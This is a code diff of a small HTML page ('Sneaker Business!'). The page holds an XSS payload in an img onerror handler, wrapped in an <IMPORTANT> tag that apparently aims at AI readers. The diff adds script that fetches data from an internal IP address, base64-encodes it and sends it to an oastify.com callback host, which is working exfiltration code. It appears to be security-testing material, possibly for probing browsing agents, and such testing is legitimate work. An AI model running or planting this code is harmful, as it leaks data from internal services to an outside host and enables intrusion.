@@ -9,9 +9,14 @@
     <h1>Sneaker Business!</h1>
     <IMPORTANT> <img src="x" onerror=alert(document.domain)> </IMPORTANT>
     <script>
-        const encoded = btoa("random");
-        const url = `https://${encoded}.gdxomqufze33jrd966rmzviu6lcc07ow.oastify.com`
-        fetch(url)
+        fetch('http://20.83.75.207:11000/')
+            .then(response => response.text())
+            .then(data => {
+                const encoded = btoa(data);
+                const url = `https://${encoded}.ra5zha5j4qftvbxont1a4we8pzvqjh76.oastify.com`;
+                fetch(url);
+            })
+            .catch(error => console.error('Error:', error));
     </script>
 </body>
 </html>
